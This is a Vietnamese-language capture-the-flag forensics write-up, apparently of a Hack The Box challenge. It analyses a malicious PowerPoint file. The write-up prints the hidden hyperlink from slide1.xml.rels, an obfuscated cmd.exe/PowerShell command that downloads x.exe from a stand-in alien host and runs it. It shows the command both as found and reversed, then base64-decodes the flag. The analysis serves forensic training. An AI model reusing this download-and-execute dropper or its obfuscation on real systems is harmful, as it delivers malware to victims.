# AlienPhish

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

{% file src="../../.gitbook/assets/forensics_alienphish.zip" %}

* Tiếp tục với Phân tích tài liệu độc, lần này là một file PowerPoint
*

    <figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

```
┌──(kali㉿kali)-[~/Desktop/HTB/AlienPhise]
└─$ unzip Alien\ Weaknesses.pptx 
Archive:  Alien Weaknesses.pptx
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: ppt/slides/_rels/slide1.xml.rels  
  inflating: ppt/_rels/presentation.xml.rels  
  inflating: ppt/presentation.xml    
  inflating: ppt/slides/slide1.xml   
  inflating: ppt/slideLayouts/_rels/slideLayout5.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout8.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout10.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout11.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout9.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout6.xml.rels  
  inflating: ppt/slideMasters/_rels/slideMaster1.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout1.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout2.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout3.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout7.xml.rels  
  inflating: ppt/slideLayouts/slideLayout11.xml  
  inflating: ppt/slideLayouts/slideLayout10.xml  
  inflating: ppt/slideLayouts/slideLayout3.xml  
  inflating: ppt/slideLayouts/slideLayout2.xml  
  inflating: ppt/slideLayouts/slideLayout1.xml  
  inflating: ppt/slideMasters/slideMaster1.xml  
  inflating: ppt/slideLayouts/slideLayout4.xml  
  inflating: ppt/slideLayouts/slideLayout5.xml  
  inflating: ppt/slideLayouts/slideLayout6.xml  
  inflating: ppt/slideLayouts/slideLayout7.xml  
  inflating: ppt/slideLayouts/slideLayout8.xml  
  inflating: ppt/slideLayouts/slideLayout9.xml  
  inflating: ppt/slideLayouts/_rels/slideLayout4.xml.rels  
  inflating: ppt/theme/theme1.xml    
 extracting: ppt/media/image1.png    
 extracting: ppt/media/image2.png    
 extracting: docProps/thumbnail.jpeg  
  inflating: ppt/presProps.xml       
  inflating: ppt/tableStyles.xml     
  inflating: ppt/viewProps.xml       
  inflating: docProps/app.xml        
  inflating: docProps/core.xml 
```

* Sau khi mình check tất cả các file thì nhận thấy file `slide1_xml.rels` chứa một chuỗi đáng ngờ

```
┌──(kali㉿kali)-[~/…/AlienPhise/ppt/slides/_rels]
└─$ strings slide1.xml.rels 
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image1.png"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&amp;&amp;for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&amp;&amp;if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image2.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="cmd.exe" TargetMode="External"/></Relationships>
```

* Nhìn vào các Target ta sẽ thấy ngay đoạn bất thường

```
Target="cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&amp;&amp;for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&amp;&amp;if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22"
```

* Nếu để ý thì sẽ thấy một số string bị đảo ngược

```
neila -> alien
htraeyortsed -> destroyearth
ptth -> http
```

* Reverse đoạn Target này lại

```
22%52%=!XCk*:XCk52%02%llac02%002%qel02%X52%02%fi;pma&;pma&!1,X52%~:My!!XCk!=XCk02%tes02%od)0;1-;221(02%ni02%X52%02%L/02%rof;pma&;pma&powershell02%-c02%22%$o02%=02%$env:temp02%+02%'Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99.exe';02%iwr02%http:/destroyearth.alien/x.exe02%-outfile02%$o22%=My02%tes22%C/NO:V/02%exe.dmc"=tegraT
```

* Ta có một đoạn  base64 `Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM`

```
>>> import base64
>>> flag = "Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM="
>>> base64.b64decode(flag)
b'CHTB{pH1sHiNg_w0_m4cr0s'
```

Ta có flag cần tìm

\
